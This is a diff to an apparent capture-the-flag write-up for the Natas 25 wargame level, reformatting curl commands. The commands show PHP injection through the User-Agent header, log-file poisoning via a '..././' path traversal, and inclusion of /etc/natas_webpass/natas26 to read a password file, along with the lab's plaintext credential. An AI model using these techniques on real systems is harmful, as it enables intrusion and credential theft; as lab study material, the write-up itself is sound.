@@ -52,19 +52,14 @@ function logRequest($message){
 There's no validation of the user agent. Here's an example of how I checked that
 if I was able to inject any php code via the user agent:
 
-1. curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d "lang=en" -H
-'User-Agent: <? echo "Wow, I can inject some php code for the user-agent";  ?>'
--b cookie.txt -c cookie.txt http://natas25.natas.labs.overthewire.org/
+1. curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d "lang=en" -H 'User-Agent: <? echo "Wow, I can inject some php code for the user-agent";  ?>' -b cookie.txt -c cookie.txt http://natas25.natas.labs.overthewire.org/
 
 2. cat cookie.txt
 
 3. Copied the PHPSESSID cookie value (necessary for step 4), which in my case was
    1baipuiqb6jk8t6hnaiicj3vc6
 
-4. curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d
-   "lang=..././logs/natas25_1baipuiqb6jk8t6hnaiicj3vc6.log" -H 'User-Agent: <? echo
-   "Wow, I can inject some php code for the user-agent";  ?>' -b cookie.txt -c
-   cookie.txt http://natas25.natas.labs.overthewire.org/
+4. curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d "lang=..././logs/natas25_1baipuiqb6jk8t6hnaiicj3vc6.log" -H 'User-Agent: <? echo "Wow, I can inject some php code for the user-agent";  ?>' -b cookie.txt -c cookie.txt http://natas25.natas.labs.overthewire.org/
 
 After step 4 I was able to see this line in the output of curl:
 
@@ -74,10 +69,7 @@ After step 4 I was able to see this line in the output of curl:
 After seeing that I was able to inject php code I included the
 "/etc/natas_webpass/natas26" with the following command:
 
-curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d
-"lang=..././logs/natas25_1baipuiqb6jk8t6hnaiicj3vc6.log" -H 'User-Agent: <? echo
-include("/etc/natas_webpass/natas26");  ?>' -b cookie.txt -c cookie.txt
-http://natas25.natas.labs.overthewire.org/
+curl -u "natas25:GHF6X7YwACaYYssHVY05cFq83hRktl4c" -d "lang=..././logs/natas25_1baipuiqb6jk8t6hnaiicj3vc6.log" -H 'User-Agent: <? echo include("/etc/natas_webpass/natas26");  ?>' -b cookie.txt -c cookie.txt http://natas25.natas.labs.overthewire.org/
 
 With this command I saw the following line in the curl command output:
 
